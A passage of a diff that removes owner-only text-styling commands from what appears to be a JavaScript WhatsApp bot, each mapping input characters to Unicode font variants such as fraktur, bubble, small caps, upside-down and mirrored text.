-const scriptMap={a:'𝒶',b:'𝒷',c:'𝒸',d:'𝒹',e:'𝑒',f:'𝒻',g:'𝑔',h:'𝒽',i:'𝒾',j:'𝒿',k:'𝓀',l:'𝓁',m:'𝓂',n:'𝓃',o:'𝑜',p:'𝓅',q:'𝓆',r:'𝓇',s:'𝓈',t:'𝓉',u:'𝓊',v:'𝓋',w:'𝓌',x:'𝓍',y:'𝓎',z:'𝓏',A:'𝒜',B:'ℬ',C:'𝒞',D:'𝒟',E:'ℰ',F:'ℱ',G:'𝒢',H:'ℋ',I:'ℐ',J:'𝒥',K:'𝒦',L:'ℒ',M:'ℳ',N:'𝒩',O:'𝒪',P:'𝒫',Q:'𝒬',R:'ℛ',S:'𝒮',T:'𝒯',U:'𝒰',V:'𝒱',W:'𝒲',X:'𝒳',Y:'𝒴',Z:'𝒵'}
-reply([...ftIn].map(c=>scriptMap[c]||c).join(''))
-} break
-
-case 'scriptbold': {
-    await X.sendMessage(m.chat, { react: { text: '𝓢', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}scriptbold [text]`)
-const scbMap={a:'𝓪',b:'𝓫',c:'𝓬',d:'𝓭',e:'𝓮',f:'𝓯',g:'𝓰',h:'𝓱',i:'𝓲',j:'𝓳',k:'𝓴',l:'𝓵',m:'𝓶',n:'𝓷',o:'𝓸',p:'𝓹',q:'𝓺',r:'𝓻',s:'𝓼',t:'𝓽',u:'𝓾',v:'𝓿',w:'𝔀',x:'𝔁',y:'𝔂',z:'𝔃',A:'𝓐',B:'𝓑',C:'𝓒',D:'𝓓',E:'𝓔',F:'𝓕',G:'𝓖',H:'𝓗',I:'𝓘',J:'𝓙',K:'𝓚',L:'𝓛',M:'𝓜',N:'𝓝',O:'𝓞',P:'𝓟',Q:'𝓠',R:'𝓡',S:'𝓢',T:'𝓣',U:'𝓤',V:'𝓥',W:'𝓦',X:'𝓧',Y:'𝓨',Z:'𝓩'}
-reply([...ftIn].map(c=>scbMap[c]||c).join(''))
-} break
-
-case 'fraktur': {
-    await X.sendMessage(m.chat, { react: { text: '𝔉', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}fraktur [text]`)
-const frakMap={a:'𝔞',b:'𝔟',c:'𝔠',d:'𝔡',e:'𝔢',f:'𝔣',g:'𝔤',h:'𝔥',i:'𝔦',j:'𝔧',k:'𝔨',l:'𝔩',m:'𝔪',n:'𝔫',o:'𝔬',p:'𝔭',q:'𝔮',r:'𝔯',s:'𝔰',t:'𝔱',u:'𝔲',v:'𝔳',w:'𝔴',x:'𝔵',y:'𝔶',z:'𝔷',A:'𝔄',B:'𝔅',C:'ℭ',D:'𝔇',E:'𝔈',F:'𝔉',G:'𝔊',H:'ℌ',I:'ℑ',J:'𝔍',K:'𝔎',L:'𝔏',M:'𝔐',N:'𝔑',O:'𝔒',P:'𝔓',Q:'𝔔',R:'ℜ',S:'𝔖',T:'𝔗',U:'𝔘',V:'𝔙',W:'𝔚',X:'𝔛',Y:'𝔜',Z:'ℨ'}
-reply([...ftIn].map(c=>frakMap[c]||c).join(''))
-} break
-
-case 'frakturbold': {
-    await X.sendMessage(m.chat, { react: { text: '𝕱', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}frakturbold [text]`)
-const fbMap={a:'𝖆',b:'𝖇',c:'𝖈',d:'𝖉',e:'𝖊',f:'𝖋',g:'𝖌',h:'𝖍',i:'𝖎',j:'𝖏',k:'𝖐',l:'𝖑',m:'𝖒',n:'𝖓',o:'𝖔',p:'𝖕',q:'𝖖',r:'𝖗',s:'𝖘',t:'𝖙',u:'𝖚',v:'𝖛',w:'𝖜',x:'𝖝',y:'𝖞',z:'𝖟',A:'𝕬',B:'𝕭',C:'𝕮',D:'𝕯',E:'𝕰',F:'𝕱',G:'𝕲',H:'𝕳',I:'𝕴',J:'𝕵',K:'𝕶',L:'𝕷',M:'𝕸',N:'𝕹',O:'𝕺',P:'𝕻',Q:'𝕼',R:'𝕽',S:'𝕾',T:'𝕿',U:'𝖀',V:'𝖁',W:'𝖂',X:'𝖃',Y:'𝖄',Z:'𝖅'}
-reply([...ftIn].map(c=>fbMap[c]||c).join(''))
-} break
-
-case 'doublestruck': {
-    await X.sendMessage(m.chat, { react: { text: '𝔻', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}doublestruck [text]`)
-const dsMap={a:'𝕒',b:'𝕓',c:'𝕔',d:'𝕕',e:'𝕖',f:'𝕗',g:'𝕘',h:'𝕙',i:'𝕚',j:'𝕛',k:'𝕜',l:'𝕝',m:'𝕞',n:'𝕟',o:'𝕠',p:'𝕡',q:'𝕢',r:'𝕣',s:'𝕤',t:'𝕥',u:'𝕦',v:'𝕧',w:'𝕨',x:'𝕩',y:'𝕪',z:'𝕫',A:'𝔸',B:'𝔹',C:'ℂ',D:'𝔻',E:'𝔼',F:'𝔽',G:'𝔾',H:'ℍ',I:'𝕀',J:'𝕁',K:'𝕂',L:'𝕃',M:'𝕄',N:'ℕ',O:'𝕆',P:'ℙ',Q:'ℚ',R:'ℝ',S:'𝕊',T:'𝕋',U:'𝕌',V:'𝕍',W:'𝕎',X:'𝕏',Y:'𝕐',Z:'ℤ','0':'𝟘','1':'𝟙','2':'𝟚','3':'𝟛','4':'𝟜','5':'𝟝','6':'𝟞','7':'𝟟','8':'𝟠','9':'𝟡'}
-reply([...ftIn].map(c=>dsMap[c]||c).join(''))
-} break
-
-case 'smallcaps': {
-    await X.sendMessage(m.chat, { react: { text: 'ꜱ', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}smallcaps [text]`)
-const scMap={a:'ᴀ',b:'ʙ',c:'ᴄ',d:'ᴅ',e:'ᴇ',f:'ꜰ',g:'ɢ',h:'ʜ',i:'ɪ',j:'ᴊ',k:'ᴋ',l:'ʟ',m:'ᴍ',n:'ɴ',o:'ᴏ',p:'ᴘ',q:'Q',r:'ʀ',s:'ꜱ',t:'ᴛ',u:'ᴜ',v:'ᴠ',w:'ᴡ',x:'x',y:'ʏ',z:'ᴢ',A:'ᴀ',B:'ʙ',C:'ᴄ',D:'ᴅ',E:'ᴇ',F:'ꜰ',G:'ɢ',H:'ʜ',I:'ɪ',J:'ᴊ',K:'ᴋ',L:'ʟ',M:'ᴍ',N:'ɴ',O:'ᴏ',P:'ᴘ',Q:'Q',R:'ʀ',S:'ꜱ',T:'ᴛ',U:'ᴜ',V:'ᴠ',W:'ᴡ',X:'x',Y:'ʏ',Z:'ᴢ'}
-reply([...ftIn].map(c=>scMap[c]||c).join(''))
-} break
-
-case 'bubble': {
-    await X.sendMessage(m.chat, { react: { text: '🔵', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}bubble [text]`)
-const bubMap={a:'ⓐ',b:'ⓑ',c:'ⓒ',d:'ⓓ',e:'ⓔ',f:'ⓕ',g:'ⓖ',h:'ⓗ',i:'ⓘ',j:'ⓙ',k:'ⓚ',l:'ⓛ',m:'ⓜ',n:'ⓝ',o:'ⓞ',p:'ⓟ',q:'ⓠ',r:'ⓡ',s:'ⓢ',t:'ⓣ',u:'ⓤ',v:'ⓥ',w:'ⓦ',x:'ⓧ',y:'ⓨ',z:'ⓩ',A:'Ⓐ',B:'Ⓑ',C:'Ⓒ',D:'Ⓓ',E:'Ⓔ',F:'Ⓕ',G:'Ⓖ',H:'Ⓗ',I:'Ⓘ',J:'Ⓙ',K:'Ⓚ',L:'Ⓛ',M:'Ⓜ',N:'Ⓝ',O:'Ⓞ',P:'Ⓟ',Q:'Ⓠ',R:'Ⓡ',S:'Ⓢ',T:'Ⓣ',U:'Ⓤ',V:'Ⓥ',W:'Ⓦ',X:'Ⓧ',Y:'Ⓨ',Z:'Ⓩ','0':'⓪','1':'①','2':'②','3':'③','4':'④','5':'⑤','6':'⑥','7':'⑦','8':'⑧','9':'⑨'}
-reply([...ftIn].map(c=>bubMap[c]||c).join(''))
-} break
-
-case 'bubblebold': {
-    await X.sendMessage(m.chat, { react: { text: '🟦', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}bubblebold [text]`)
-const bbbMap={a:'🅐',b:'🅑',c:'🅒',d:'🅓',e:'🅔',f:'🅕',g:'🅖',h:'🅗',i:'🅘',j:'🅙',k:'🅚',l:'🅛',m:'🅜',n:'🅝',o:'🅞',p:'🅟',q:'🅠',r:'🅡',s:'🅢',t:'🅣',u:'🅤',v:'🅥',w:'🅦',x:'🅧',y:'🅨',z:'🅩',A:'🅐',B:'🅑',C:'🅒',D:'🅓',E:'🅔',F:'🅕',G:'🅖',H:'🅗',I:'🅘',J:'🅙',K:'🅚',L:'🅛',M:'🅜',N:'🅝',O:'🅞',P:'🅟',Q:'🅠',R:'🅡',S:'🅢',T:'🅣',U:'🅤',V:'🅥',W:'🅦',X:'🅧',Y:'🅨',Z:'🅩'}
-reply([...ftIn].map(c=>bbbMap[c]||c).join(''))
-} break
-
-case 'square': {
-    await X.sendMessage(m.chat, { react: { text: '🟥', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}square [text]`)
-const sqMap={a:'🄰',b:'🄱',c:'🄲',d:'🄳',e:'🄴',f:'🄵',g:'🄶',h:'🄷',i:'🄸',j:'🄹',k:'🄺',l:'🄻',m:'🄼',n:'🄽',o:'🄾',p:'🄿',q:'🅀',r:'🅁',s:'🅂',t:'🅃',u:'🅄',v:'🅅',w:'🅆',x:'🅇',y:'🅈',z:'🅉',A:'🄰',B:'🄱',C:'🄲',D:'🄳',E:'🄴',F:'🄵',G:'🄶',H:'🄷',I:'🄸',J:'🄹',K:'🄺',L:'🄻',M:'🄼',N:'🄽',O:'🄾',P:'🄿',Q:'🅀',R:'🅁',S:'🅂',T:'🅃',U:'🅄',V:'🅅',W:'🅆',X:'🅇',Y:'🅈',Z:'🅉'}
-reply([...ftIn].map(c=>sqMap[c]||c).join(''))
-} break
-
-case 'squarebold': {
-    await X.sendMessage(m.chat, { react: { text: '🟥', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}squarebold [text]`)
-const sqbMap={a:'🅰',b:'🅱',c:'🅲',d:'🅳',e:'🅴',f:'🅵',g:'🅶',h:'🅷',i:'🅸',j:'🅹',k:'🅺',l:'🅻',m:'🅼',n:'🅽',o:'🅾',p:'🅿',q:'🆀',r:'🆁',s:'🆂',t:'🆃',u:'🆄',v:'🆅',w:'🆆',x:'🆇',y:'🆈',z:'🆉',A:'🅰',B:'🅱',C:'🅲',D:'🅳',E:'🅴',F:'🅵',G:'🅶',H:'🅷',I:'🅸',J:'🅹',K:'🅺',L:'🅻',M:'🅼',N:'🅽',O:'🅾',P:'🅿',Q:'🆀',R:'🆁',S:'🆂',T:'🆃',U:'🆄',V:'🆅',W:'🆆',X:'🆇',Y:'🆈',Z:'🆉'}
-reply([...ftIn].map(c=>sqbMap[c]||c).join(''))
-} break
-
-case 'wide': {
-    await X.sendMessage(m.chat, { react: { text: '🔡', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}wide [text]`)
-reply([...ftIn].map(c=>{let code=c.charCodeAt(0);return (code>=33&&code<=126)?String.fromCharCode(code+65248):c==' '?'　':c}).join(''))
-} break
-
-case 'upsidedown': {
-    await X.sendMessage(m.chat, { react: { text: '🙃', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}upsidedown [text]`)
-const udMap={a:'ɐ',b:'q',c:'ɔ',d:'p',e:'ǝ',f:'ɟ',g:'ƃ',h:'ɥ',i:'ᴉ',j:'ɾ',k:'ʞ',l:'l',m:'ɯ',n:'u',o:'o',p:'d',q:'b',r:'ɹ',s:'s',t:'ʇ',u:'n',v:'ʌ',w:'ʍ',x:'x',y:'ʎ',z:'z',A:'∀',B:'𐐒',C:'Ɔ',D:'ᗡ',E:'Ǝ',F:'Ⅎ',G:'פ',H:'H',I:'I',J:'ſ',K:'ʞ',L:'˥',M:'W',N:'N',O:'O',P:'Ԁ',Q:'Q',R:'ɹ',S:'S',T:'┴',U:'∩',V:'Λ',W:'M',X:'X',Y:'⅄',Z:'Z','0':'0','1':'Ɩ','2':'ᄅ','3':'Ɛ','4':'ㄣ','5':'ϛ','6':'9','7':'L','8':'8','9':'6',',':'\'','\'':',','.':'˙','?':'¿','!':'¡','(':')',')':'(','[':']',']':'[','{':'}','}':'{','<':'>','>':'<','&':'⅋',_:'‾'}
-reply([...ftIn].map(c=>udMap[c]||c).join('').split('').reverse().join(''))
-} break
-
-case 'strikethrough': {
-    await X.sendMessage(m.chat, { react: { text: '~~', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}strikethrough [text]`)
-reply([...ftIn].map(c=>c+'\u0336').join(''))
-} break
-
-case 'underline': {
-    await X.sendMessage(m.chat, { react: { text: '📏', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}underline [text]`)
-reply([...ftIn].map(c=>c+'\u0332').join(''))
-} break
-
-case 'superscript': {
-    await X.sendMessage(m.chat, { react: { text: '⁰', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}superscript [text]`)
-const sspMap={a:'ᵃ',b:'ᵇ',c:'ᶜ',d:'ᵈ',e:'ᵉ',f:'ᶠ',g:'ᵍ',h:'ʰ',i:'ⁱ',j:'ʲ',k:'ᵏ',l:'ˡ',m:'ᵐ',n:'ⁿ',o:'ᵒ',p:'ᵖ',q:'q',r:'ʳ',s:'ˢ',t:'ᵗ',u:'ᵘ',v:'ᵛ',w:'ʷ',x:'ˣ',y:'ʸ',z:'ᶻ',A:'ᴬ',B:'ᴮ',C:'ᶜ',D:'ᴰ',E:'ᴱ',F:'ᶠ',G:'ᴳ',H:'ᴴ',I:'ᴵ',J:'ᴶ',K:'ᴷ',L:'ᴸ',M:'ᴹ',N:'ᴺ',O:'ᴼ',P:'ᴾ',Q:'Q',R:'ᴿ',S:'ˢ',T:'ᵀ',U:'ᵁ',V:'ᵛ',W:'ᵂ',X:'ˣ',Y:'ʸ',Z:'ᶻ','0':'⁰','1':'¹','2':'²','3':'³','4':'⁴','5':'⁵','6':'⁶','7':'⁷','8':'⁸','9':'⁹'}
-reply([...ftIn].map(c=>sspMap[c]||c).join(''))
-} break
-
-case 'subscript': {
-    await X.sendMessage(m.chat, { react: { text: '₀', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}subscript [text]`)
-const subMap={a:'ₐ',b:'b',c:'c',d:'d',e:'ₑ',f:'f',g:'g',h:'ₕ',i:'ᵢ',j:'ⱼ',k:'ₖ',l:'ₗ',m:'ₘ',n:'ₙ',o:'ₒ',p:'ₚ',q:'q',r:'ᵣ',s:'ₛ',t:'ₜ',u:'ᵤ',v:'ᵥ',w:'w',x:'ₓ',y:'y',z:'z',A:'A',B:'B',C:'C',D:'D',E:'E',F:'F',G:'G',H:'H',I:'I',J:'J',K:'K',L:'L',M:'M',N:'N',O:'O',P:'P',Q:'Q',R:'R',S:'S',T:'T',U:'U',V:'V',W:'W',X:'X',Y:'Y',Z:'Z','0':'₀','1':'₁','2':'₂','3':'₃','4':'₄','5':'₅','6':'₆','7':'₇','8':'₈','9':'₉'}
-reply([...ftIn].map(c=>subMap[c]||c).join(''))
-} break
-
-case 'medieval': {
-    await X.sendMessage(m.chat, { react: { text: '🏰', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}medieval [text]`)
-const medMap={a:'𝔞',b:'𝔟',c:'𝔠',d:'𝔡',e:'𝔢',f:'𝔣',g:'𝔤',h:'𝔥',i:'𝔦',j:'𝔧',k:'𝔨',l:'𝔩',m:'𝔪',n:'𝔫',o:'𝔬',p:'𝔭',q:'𝔮',r:'𝔯',s:'𝔰',t:'𝔱',u:'𝔲',v:'𝔳',w:'𝔴',x:'𝔵',y:'𝔶',z:'𝔷',A:'𝕬',B:'𝕭',C:'𝕮',D:'𝕯',E:'𝕰',F:'𝕱',G:'𝕲',H:'𝕳',I:'𝕴',J:'𝕵',K:'𝕶',L:'𝕷',M:'𝕸',N:'𝕹',O:'𝕺',P:'𝕻',Q:'𝕼',R:'𝕽',S:'𝕾',T:'𝕿',U:'𝖀',V:'𝖁',W:'𝖂',X:'𝖃',Y:'𝖄',Z:'𝖅'}
-reply([...ftIn].map(c=>medMap[c]||c).join(''))
-} break
-
-case 'circled': {
-    await X.sendMessage(m.chat, { react: { text: '⭕', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}circled [text]`)
-const cirMap={a:'ⓐ',b:'ⓑ',c:'ⓒ',d:'ⓓ',e:'ⓔ',f:'ⓕ',g:'ⓖ',h:'ⓗ',i:'ⓘ',j:'ⓙ',k:'ⓚ',l:'ⓛ',m:'ⓜ',n:'ⓝ',o:'ⓞ',p:'ⓟ',q:'ⓠ',r:'ⓡ',s:'ⓢ',t:'ⓣ',u:'ⓤ',v:'ⓥ',w:'ⓦ',x:'ⓧ',y:'ⓨ',z:'ⓩ',A:'Ⓐ',B:'Ⓑ',C:'Ⓒ',D:'Ⓓ',E:'Ⓔ',F:'Ⓕ',G:'Ⓖ',H:'Ⓗ',I:'Ⓘ',J:'Ⓙ',K:'Ⓚ',L:'Ⓛ',M:'Ⓜ',N:'Ⓝ',O:'Ⓞ',P:'Ⓟ',Q:'Ⓠ',R:'Ⓡ',S:'Ⓢ',T:'Ⓣ',U:'Ⓤ',V:'Ⓥ',W:'Ⓦ',X:'Ⓧ',Y:'Ⓨ',Z:'Ⓩ','0':'⓪','1':'①','2':'②','3':'③','4':'④','5':'⑤','6':'⑥','7':'⑦','8':'⑧','9':'⑨'}
-reply([...ftIn].map(c=>cirMap[c]||c).join(''))
-} break
-
-case 'negative': {
-    await X.sendMessage(m.chat, { react: { text: '🔲', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}negative [text]`)
-const negMap={a:'🅐',b:'🅑',c:'🅒',d:'🅓',e:'🅔',f:'🅕',g:'🅖',h:'🅗',i:'🅘',j:'🅙',k:'🅚',l:'🅛',m:'🅜',n:'🅝',o:'🅞',p:'🅟',q:'🅠',r:'🅡',s:'🅢',t:'🅣',u:'🅤',v:'🅥',w:'🅦',x:'🅧',y:'🅨',z:'🅩',A:'🅐',B:'🅑',C:'🅒',D:'🅓',E:'🅔',F:'🅕',G:'🅖',H:'🅗',I:'🅘',J:'🅙',K:'🅚',L:'🅛',M:'🅜',N:'🅝',O:'🅞',P:'🅟',Q:'🅠',R:'🅡',S:'🅢',T:'🅣',U:'🅤',V:'🅥',W:'🅦',X:'🅧',Y:'🅨',Z:'🅩'}
-reply([...ftIn].map(c=>negMap[c]||c).join(''))
-} break
-
-case 'parenthesized': {
-    await X.sendMessage(m.chat, { react: { text: '〔〕', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}parenthesized [text]`)
-const parMap={a:'⒜',b:'⒝',c:'⒞',d:'⒟',e:'⒠',f:'⒡',g:'⒢',h:'⒣',i:'⒤',j:'⒥',k:'⒦',l:'⒧',m:'⒨',n:'⒩',o:'⒪',p:'⒫',q:'⒬',r:'⒭',s:'⒮',t:'⒯',u:'⒰',v:'⒱',w:'⒲',x:'⒳',y:'⒴',z:'⒵',A:'⒜',B:'⒝',C:'⒞',D:'⒟',E:'⒠',F:'⒡',G:'⒢',H:'⒣',I:'⒤',J:'⒥',K:'⒦',L:'⒧',M:'⒨',N:'⒩',O:'⒪',P:'⒫',Q:'⒬',R:'⒭',S:'⒮',T:'⒯',U:'⒰',V:'⒱',W:'⒲',X:'⒳',Y:'⒴',Z:'⒵'}
-reply([...ftIn].map(c=>parMap[c]||c).join(''))
-} break
-
-case 'gothic': {
-    await X.sendMessage(m.chat, { react: { text: '🦇', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}gothic [text]`)
-const gotMap={a:'𝖆',b:'𝖇',c:'𝖈',d:'𝖉',e:'𝖊',f:'𝖋',g:'𝖌',h:'𝖍',i:'𝖎',j:'𝖏',k:'𝖐',l:'𝖑',m:'𝖒',n:'𝖓',o:'𝖔',p:'𝖕',q:'𝖖',r:'𝖗',s:'𝖘',t:'𝖙',u:'𝖚',v:'𝖛',w:'𝖜',x:'𝖝',y:'𝖞',z:'𝖟',A:'𝔄',B:'𝔅',C:'ℭ',D:'𝔇',E:'𝔈',F:'𝔉',G:'𝔊',H:'ℌ',I:'ℑ',J:'𝔍',K:'𝔎',L:'𝔏',M:'𝔐',N:'𝔑',O:'𝔒',P:'𝔓',Q:'𝔔',R:'ℜ',S:'𝔖',T:'𝔗',U:'𝔘',V:'𝔙',W:'𝔚',X:'𝔛',Y:'𝔜',Z:'ℨ'}
-reply([...ftIn].map(c=>gotMap[c]||c).join(''))
-} break
-
-case 'cursive': {
-    await X.sendMessage(m.chat, { react: { text: '✒️', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}cursive [text]`)
-const crvMap={a:'𝓪',b:'𝓫',c:'𝓬',d:'𝓭',e:'𝓮',f:'𝓯',g:'𝓰',h:'𝓱',i:'𝓲',j:'𝓳',k:'𝓴',l:'𝓵',m:'𝓶',n:'𝓷',o:'𝓸',p:'𝓹',q:'𝓺',r:'𝓻',s:'𝓼',t:'𝓽',u:'𝓾',v:'𝓿',w:'𝔀',x:'𝔁',y:'𝔂',z:'𝔃',A:'𝓐',B:'𝓑',C:'𝓒',D:'𝓓',E:'𝓔',F:'𝓕',G:'𝓖',H:'𝓗',I:'𝓘',J:'𝓙',K:'𝓚',L:'𝓛',M:'𝓜',N:'𝓝',O:'𝓞',P:'𝓟',Q:'𝓠',R:'𝓡',S:'𝓢',T:'𝓣',U:'𝓤',V:'𝓥',W:'𝓦',X:'𝓧',Y:'𝓨',Z:'𝓩'}
-reply([...ftIn].map(c=>crvMap[c]||c).join(''))
-} break
-
-case 'aesthetic': {
-    await X.sendMessage(m.chat, { react: { text: '✨', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}aesthetic [text]`)
-const aesMap={a:'ａ',b:'ｂ',c:'ｃ',d:'ｄ',e:'ｅ',f:'ｆ',g:'ｇ',h:'ｈ',i:'ｉ',j:'ｊ',k:'ｋ',l:'ｌ',m:'ｍ',n:'ｎ',o:'ｏ',p:'ｐ',q:'ｑ',r:'ｒ',s:'ｓ',t:'ｔ',u:'ｕ',v:'ｖ',w:'ｗ',x:'ｘ',y:'ｙ',z:'ｚ',A:'Ａ',B:'Ｂ',C:'Ｃ',D:'Ｄ',E:'Ｅ',F:'Ｆ',G:'Ｇ',H:'Ｈ',I:'Ｉ',J:'Ｊ',K:'Ｋ',L:'Ｌ',M:'Ｍ',N:'Ｎ',O:'Ｏ',P:'Ｐ',Q:'Ｑ',R:'Ｒ',S:'Ｓ',T:'Ｔ',U:'Ｕ',V:'Ｖ',W:'Ｗ',X:'Ｘ',Y:'Ｙ',Z:'Ｚ','0':'０','1':'１','2':'２','3':'３','4':'４','5':'５','6':'６','7':'７','8':'８','9':'９'}
-reply([...ftIn].map(c=>aesMap[c]||c).join(''))
-} break
-
-case 'tiny': {
-    await X.sendMessage(m.chat, { react: { text: '🔹', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}tiny [text]`)
-const tnyMap={a:'ᵃ',b:'ᵇ',c:'ᶜ',d:'ᵈ',e:'ᵉ',f:'ᶠ',g:'ᵍ',h:'ʰ',i:'ⁱ',j:'ʲ',k:'ᵏ',l:'ˡ',m:'ᵐ',n:'ⁿ',o:'ᵒ',p:'ᵖ',q:'q',r:'ʳ',s:'ˢ',t:'ᵗ',u:'ᵘ',v:'ᵛ',w:'ʷ',x:'ˣ',y:'ʸ',z:'ᶻ',A:'ᴬ',B:'ᴮ',C:'ᶜ',D:'ᴰ',E:'ᴱ',F:'ᶠ',G:'ᴳ',H:'ᴴ',I:'ᴵ',J:'ᴶ',K:'ᴷ',L:'ᴸ',M:'ᴹ',N:'ᴺ',O:'ᴼ',P:'ᴾ',Q:'Q',R:'ᴿ',S:'ˢ',T:'ᵀ',U:'ᵁ',V:'ᵛ',W:'ᵂ',X:'ˣ',Y:'ʸ',Z:'ᶻ'}
-reply([...ftIn].map(c=>tnyMap[c]||c).join(''))
-} break
-
-case 'inverted': {
-    await X.sendMessage(m.chat, { react: { text: '🔄', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}inverted [text]`)
-const invMap={a:'ɐ',b:'q',c:'ɔ',d:'p',e:'ǝ',f:'ɟ',g:'ƃ',h:'ɥ',i:'ᴉ',j:'ɾ',k:'ʞ',l:'l',m:'ɯ',n:'u',o:'o',p:'d',q:'b',r:'ɹ',s:'s',t:'ʇ',u:'n',v:'ʌ',w:'ʍ',x:'x',y:'ʎ',z:'z',A:'∀',B:'q',C:'Ɔ',D:'p',E:'Ǝ',F:'Ⅎ',G:'פ',H:'H',I:'I',J:'ɾ',K:'ʞ',L:'˥',M:'W',N:'N',O:'O',P:'Ԁ',Q:'Q',R:'ɹ',S:'S',T:'┴',U:'∩',V:'Λ',W:'M',X:'X',Y:'ʎ',Z:'Z'}
-reply([...ftIn].map(c=>invMap[c]||c).join('').split('').reverse().join(''))
-} break
-
-case 'mirror': {
-    await X.sendMessage(m.chat, { react: { text: '🔁', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}mirror [text]`)
-const mirMap={a:'ɒ',b:'d',c:'ɔ',d:'b',e:'ɘ',f:'ʇ',g:'ϱ',h:'ʜ',i:'i',j:'ᴉ',k:'ʞ',l:'l',m:'m',n:'n',o:'o',p:'q',q:'p',r:'ɿ',s:'ƨ',t:'ƚ',u:'u',v:'v',w:'w',x:'x',y:'y',z:'z',A:'A',B:'ᗺ',C:'Ɔ',D:'ᗡ',E:'Ǝ',F:'ꟻ',G:'Ꭾ',H:'H',I:'I',J:'Ꮈ',K:'ꓘ',L:'⅃',M:'M',N:'И',O:'O',P:'ꟼ',Q:'Ọ',R:'Я',S:'Ƨ',T:'T',U:'U',V:'V',W:'W',X:'X',Y:'Y',Z:'Z'}
-reply([...ftIn].map(c=>mirMap[c]||c).join('').split('').reverse().join(''))
-} break
-
-case 'currency': {
